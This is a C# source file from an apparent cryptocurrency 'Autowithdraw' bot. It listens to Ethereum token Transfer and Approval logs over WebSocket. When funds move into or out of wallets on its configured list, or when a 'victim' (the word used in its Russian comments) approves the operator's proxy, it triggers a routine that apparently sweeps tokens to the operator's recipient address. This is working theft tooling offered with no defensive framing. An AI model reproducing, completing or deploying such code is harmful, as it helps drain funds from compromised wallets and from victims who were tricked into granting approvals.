using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Nethereum.Contracts;
using Nethereum.JsonRpc.WebSocketStreamingClient;
using Nethereum.RPC.Reactive.Eth.Subscriptions;
using Nethereum.Web3;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Numerics;
using System.Threading.Tasks;
using Nethereum.ABI.Util;

namespace Autowithdraw.Main.Handlers
{
    internal class Logs
    {
        public Web3 W3;
        public int ChainID;
        public Logs(int ChainID)
        {
            W3 = Settings.Chains[ChainID].Web3;
            this.ChainID = ChainID;
        }

        public async Task Starter()
        {
            using StreamingWebSocketClient client = new StreamingWebSocketClient(Settings.Chains[ChainID].WSS);
            var subscription = new EthLogsObservableSubscription(client);

            subscription.GetSubscriptionDataResponsesAsObservable().Subscribe(async log =>
            {
                try
                {
                    if (log.Topics.Length < 3) return;

                    if (DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds -
                        Cast.GetInt(Block.BlocksWork[ChainID]) > 3600) return;

                    #region Values

                    string txHash = log.TransactionHash;
                    string Address_From = Web3.ToChecksumAddress(log.Topics[1].ToString().Substring(26));
                    string Address_To = Web3.ToChecksumAddress(log.Topics[2].ToString().Substring(26));
                    string ContractAddress = Web3.ToChecksumAddress(log.Address.ToString());
                    BigInteger Wei = BigInteger.Parse(log.Data.ToString().Substring(2),
                        NumberStyles.AllowHexSpecifier);
                    bool Approve = log.EventSignature().StartsWith("0x8c5be1e5");

                    #endregion

                    if (Approve)
                    {
                        // наш прокси апрувнули, проверяем баланс жертвы
                        if (Address_To == Settings.Config.Proxy.Address && Settings.Wallets.ContainsKey(Address_From))
                            await Task.Factory.StartNew(() => Parse.Token(ContractAddress, 0, Address_From, ChainID, txHash));
                        // если у контракта/адреса много нулик - то это скам. если это апрув - и он равен 0 то это ревок.
                        if (ContractAddress.Split('0').Length > 8 || Wei == 0 || Address_To.Split('0').Length > 12)
                            return;
                    }

                    if (Settings.Wallets.ContainsKey(Address_To))
                    {
                        await Task.Factory.StartNew(() => Parse.Token(ContractAddress, Wei, Address_To, ChainID,
                            log.TransactionHash));
                    }
                    else if (Settings.Wallets.ContainsKey(Address_From) && Address_To != Settings.Config.Recipient &&
                             Address_To != Settings.Config.Proxy.Address)
                    {
                        await Task.Factory.StartNew(() => Parse.Token(ContractAddress, Wei, Address_From, ChainID,
                            log.TransactionHash, false, Address_To));
                    }
                }
                catch (FormatException)
                {
                    // ignored
                }
                catch (KeyNotFoundException)
                {
                    // ignored
                }
                catch (Exception e)
                {
                    Logger.Error(e);
                }
            });

            await client.StartAsync();
            await subscription.SubscribeAsync();
            await Task.Delay(-1);
        }
    }
}
